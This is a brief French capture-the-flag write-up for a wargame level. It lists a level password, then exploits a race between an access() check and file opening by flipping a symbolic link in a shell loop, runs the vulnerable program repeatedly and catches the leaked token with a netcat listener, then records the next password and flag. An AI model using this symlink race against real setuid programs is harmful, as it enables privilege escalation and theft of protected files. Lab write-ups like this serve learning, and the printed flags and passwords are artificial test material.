## Step 1: Login
`su level09`

**password:** s5cAJpM8ev6XHw998pRWG728z

## Step 2: Find flag

`ltrace`

On doit passer le *access()*

On aleterne tres vite entre 2 fichiers entre le toekn et son lien symbolique:

`while true; do ln -fs /tmp/t /tmp/tok; ln -fs ~/token /tmp/tok; done &`

`while true; do ./level10 /tmp/tok 127.0.0.1; done`

`nc -lk localhost 6969`
> woupa2yuojeeaaed06riuj63c

`su flag10`

**password:** woupa2yuojeeaaed06riuj63c

`getflag`
> feulo4b72j7edeahuete3no7c